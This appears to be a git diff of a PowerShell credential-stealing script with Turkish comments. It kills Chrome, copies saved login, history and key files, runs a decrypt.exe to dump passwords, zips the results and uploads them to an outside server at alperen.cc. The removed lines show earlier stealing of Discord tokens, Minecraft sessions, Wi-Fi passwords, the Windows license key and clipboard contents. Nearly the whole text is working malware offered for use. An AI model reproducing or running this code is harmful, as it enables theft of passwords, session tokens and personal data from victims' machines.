@@ -1,26 +1,32 @@
-#-- Gelişmiş Bilgi Toplama Script'i (Discord, Minecraft, Clipboard, Windows Key, Cihaz Bilgisi) --#
-
 # Set destination directory for storing data
 $destDir = "$env:APPDATA\BrowserData"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir
 }
 
-# Function to copy browser files
+# Function to copy browser files only if they exist
 function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
-    if (-Not (Test-Path $browserDestDir)) {
-        New-Item -ItemType Directory -Path $browserDestDir
-    }
+    $fileCopied = $false  # Track if at least one file is copied
 
     foreach ($file in $filesToCopy) {
         $source = Join-Path -Path $browserDir -ChildPath $file
         if (Test-Path $source) {
+            if (-Not (Test-Path $browserDestDir)) {
+                New-Item -ItemType Directory -Path $browserDestDir
+            }
             Copy-Item -Path $source -Destination $browserDestDir
             Write-Host "$browserName - File copied: $file"
+            $fileCopied = $true
         } else {
             Write-Host "$browserName - File not found: $file"
         }
+    }
+
+    # If no files are copied, do not create directory
+    if (-Not $fileCopied -and (Test-Path $browserDestDir)) {
+        Remove-Item -Path $browserDestDir -Force
+        Write-Host "$browserName - No files copied, directory removed."
     }
 }
 
@@ -46,123 +52,41 @@ foreach ($profile in $profiles) {
     # Kill Chrome processes
     KillBrowserProcesses "chrome"
 
-    # Copy the necessary files (Login Data, etc.)
-    $filesToCopy = @("Login Data", "Local State")
+    # Copy the necessary files (Login Data, History, etc.)
+    $filesToCopy = @("Login Data", "History", "Local State")
     CopyBrowserFiles $profileName $profileDir $filesToCopy
 
-    # If Local State exists, copy it
-    $localStateFile = Join-Path -Path $chromeUserDataDir -ChildPath "Local State"
-    if (Test-Path $localStateFile) {
-        Copy-Item -Path $localStateFile -Destination (Join-Path -Path $destDir -ChildPath $profileName) -ErrorAction SilentlyContinue
-        Write-Host "$profileName - Local State file copied."
-    }
-
-    # Decrypt the Login Data if decrypt.exe is available
-    $decryptExePath = Join-Path -Path "$destDir\$profileName" -ChildPath "decrypt.exe"
+    # If Local State and Login Data exist, use decrypt.exe
+    $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
     $loginDataPath = Join-Path -Path "$destDir\$profileName" -ChildPath "Login Data"
     $localStatePath = Join-Path -Path "$destDir\$profileName" -ChildPath "Local State"
-    
     $outputPath = Join-Path -Path $destDir -ChildPath "decrypted_$profileName.txt"
     
-    if (Test-Path $decryptExePath) {
-        if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
-            # Run the decrypt.exe with specified parameters and capture output
+    if (Test-Path $decryptExePath -and Test-Path $loginDataPath -and Test-Path $localStatePath) {
+        try {
+            # Run decrypt.exe
             $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-            Write-Host "Decrypt.exe output for ${profileName}: $($result)"
-    
+            Write-Host "Decrypt.exe output for $profileName: $($result)"
+
             if (Test-Path $outputPath) {
                 Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
             } else {
                 Write-Host "$profileName - Decrypted passwords not found."
             }
-    
+
             # Delete decrypt.exe after use
-            try {
-                Remove-Item $decryptExePath -Force -ErrorAction Stop
-                Write-Host "$profileName - decrypt.exe deleted to reduce size."
-            } catch {
-                Write-Host "$profileName - decrypt.exe could not be deleted: $_"
-            }
-        } else {
-            Write-Host "$profileName - Login Data or Local State not found."
+            Remove-Item $decryptExePath -Force -ErrorAction Stop
+            Write-Host "$profileName - decrypt.exe deleted after use."
+        } catch {
+            Write-Host "$profileName - Error running decrypt.exe: $_"
         }
     } else {
-        Write-Host "$profileName - decrypt.exe not found."
+        Write-Host "$profileName - Required files or decrypt.exe not found."
     }
 }
 
-# Discord token stealing
-$discordPaths = @(
-    "$env:APPDATA\Discord\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb"
-)
-$discordDestDir = Join-Path -Path $destDir -ChildPath "Discord"
-if (-Not (Test-Path $discordDestDir)) {
-    New-Item -ItemType Directory -Path $discordDestDir
-}
-
-foreach ($path in $discordPaths) {
-    if (Test-Path $path) {
-        Copy-Item -Path "$path\*" -Destination $discordDestDir -Recurse -Force
-        Write-Host "Copied Discord token files from $path"
-    } else {
-        Write-Host "Discord token path not found: $path"
-    }
-}
-
-# Minecraft session stealing
-$minecraftPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
-$minecraftDestDir = Join-Path -Path $destDir -ChildPath "Minecraft"
-if (-Not (Test-Path $minecraftDestDir)) {
-    New-Item -ItemType Directory -Path $minecraftDestDir
-}
-
-if (Test-Path $minecraftPath) {
-    Copy-Item -Path $minecraftPath -Destination $minecraftDestDir
-    Write-Host "Minecraft session file copied."
-} else {
-    Write-Host "Minecraft session file not found."
-}
-
-# Stealing Wi-Fi passwords
-$wifiDestDir = Join-Path -Path $destDir -ChildPath "WiFiPasswords"
-if (-Not (Test-Path $wifiDestDir)) {
-    New-Item -ItemType Directory -Path $wifiDestDir
-}
-
-$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
-foreach ($profile in $wifiProfiles) {
-    $wifiInfo = netsh wlan show profile name="$profile" key=clear
-    $wifiInfo | Out-File -FilePath (Join-Path -Path $wifiDestDir -ChildPath "$profile.txt")
-    Write-Host "Wi-Fi password saved for profile: $profile"
-}
-
-# Collecting Windows License Key
-$windowsKeyDest = Join-Path -Path $destDir -ChildPath "WindowsKey.txt"
-$windowsKey = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
-$windowsKey | Out-File -FilePath $windowsKeyDest
-Write-Host "Windows key saved."
-
-# Collecting Clipboard Data
-$clipboardData = Get-Clipboard
-$clipboardFile = Join-Path -Path $destDir -ChildPath "ClipboardData.txt"
-$clipboardData | Out-File -FilePath $clipboardFile
-Write-Host "Clipboard data saved."
-
-# Collecting System Info
-$systemInfo = Get-ComputerInfo
-$systemInfoFile = Join-Path -Path $destDir -ChildPath "SystemInfo.txt"
-$systemInfo | Out-File -FilePath $systemInfoFile
-Write-Host "System info saved."
-
-# Collecting Network Configuration
-$networkConfig = Get-NetIPConfiguration
-$networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
-$networkConfig | Out-File -FilePath $networkConfigFile
-Write-Host "Network configuration saved."
-
-# Compress the entire BrowserData directory into a ZIP file
-$zipDir = "$env:APPDATA\ZippedBrowserData"
+# Compress the entire BrowserData directory into a ZIP file and save to %APPDATA%\zippedbrowserdata
+$zipDir = "$env:APPDATA\zippedbrowserdata"
 if (-Not (Test-Path $zipDir)) {
     New-Item -ItemType Directory -Path $zipDir
 }
@@ -170,6 +94,14 @@ if (-Not (Test-Path $zipDir)) {
 $folderPath = $destDir
 $zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"
 
+if (Test-Path $zipFilePath) {
+    Remove-Item $zipFilePath -Force
+}
+
+Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
+Write-Host "BrowserData directory has been compressed and saved to: $zipFilePath"
+
+# Upload the ZIP file (optional step)
 $url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
 if (Test-Path $zipFilePath) {
@@ -192,32 +124,30 @@ if (Test-Path $zipFilePath) {
         $writer.Write($header)
         $writer.Flush()
 
-        # Binary dosyayı ekleme
+        # Dosya verisini ekleme
         $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
-        $writer.Flush()
 
-        # Footer ekle
+        # Footer'ı ekleme
         $writer.Write($footer)
         $writer.Flush()
 
-        # Body'yi byte array olarak oku
-        $bodyStream.Position = 0
-        $bodyBytes = $bodyStream.ToArray()
+        $bodyStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
 
-        # POST isteğini gönder
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop
+        # HTTP POST isteği gönderme
+        $webRequest = [System.Net.HttpWebRequest]::Create($url)
+        $webRequest.Method = "POST"
+        $webRequest.ContentType = $contentType
+        $webRequest.ContentLength = $bodyStream.Length
 
-        # Yanıtı göster
-        Write-Output $response
+        $bodyStream.CopyTo($webRequest.GetRequestStream())
 
-        # Temizlik
-        $writer.Dispose()
-        $bodyStream.Dispose()
+        $response = $webRequest.GetResponse()
+        Write-Host "Uploaded ZIP file successfully."
     } catch {
-        Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
+        Write-Host "Error during upload: $_"
     }
 } else {
-    Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
+    Write-Host "ZIP file not found."
 }
 
 Write-Host "Script execution completed."
